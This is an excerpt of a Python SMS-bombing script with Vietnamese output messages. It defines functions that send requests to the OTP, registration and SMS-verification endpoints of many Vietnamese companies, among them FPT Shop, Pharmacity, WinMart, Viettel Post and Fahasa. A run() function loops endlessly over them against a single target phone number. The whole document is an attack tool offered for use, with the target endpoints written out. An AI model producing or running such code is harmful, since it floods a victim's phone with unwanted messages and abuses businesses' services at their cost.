...
def fptshop(phone):
    ...
    response = requests.post(
        'https://papi.fptshop.com.vn/gw/is/user/new-send-verification', headers=headers, json=json_data)
...
def phar(phone):
    ...
    response = requests.options(
        'https://api-gateway.pharmacity.vn/customers/register/otp', headers=headers)
    ...
    response = requests.post(
        'https://api-gateway.pharmacity.vn/customers/register/otp', headers=headers, json=json_data)
...
def one(phone):
    ...
    response = requests.post(
        'https://apivideo.mocha.com.vn/onMediaBackendBiz/mochavideo/getOtp', params=params, headers=headers)
...
def mocha(phone):
    ...
    response = requests.post(
        'https://v9-cc.800best.com/uc/account/sendsignupcode', headers=headers, json=json_data)
...
def winmart(phone):
    ...
    response = requests.post(
        'https://api-crownx.winmart.vn/iam/api/v1/user/register', headers=headers, json=json_data)
...
def alf(phone):
    ...
    response = requests.post('https://api.alfrescos.com.vn/api/v1/User/SendSms',
...
def vtpost(phone):
    ...
    response = requests.post('https://id.viettelpost.vn/Account/SendOTPByPhone',
                             cookies=cookies, headers=headers, data=data)
...
def dkimu(phone):
    ...
    response = requests.post(
        'https://api-omni.mutosi.com/client/auth/register', headers=headers, json=json_data)
...
def otpmu(phone):
    ...
    response = requests.post(
        'https://api-omni.mutosi.com/client/auth/reset-password/send-phone', headers=headers, json=json_data)
...
def acfc(phone):
    ...
    response = requests.post('https://www.acfc.com.vn/mgn_customer/customer/sendOTP',
                             cookies=cookies, headers=headers, data=data)
...
def fa(phone):
    ...
    response = requests.post('https://www.fahasa.com/ajaxlogin/ajax/checkPhone',
                             cookies=cookies, headers=headers, data=data)
...
def run(sdt):
    apis = [twilio, robot, fb, dvcd, myvt, phar, one, sapo]
    while True:
        for api in apis:
            try:
                api(sdt)
                print(
                    f"{luc}[+] Đã gửi thành công {api.__name__} đến số {sdt}.{hong}")
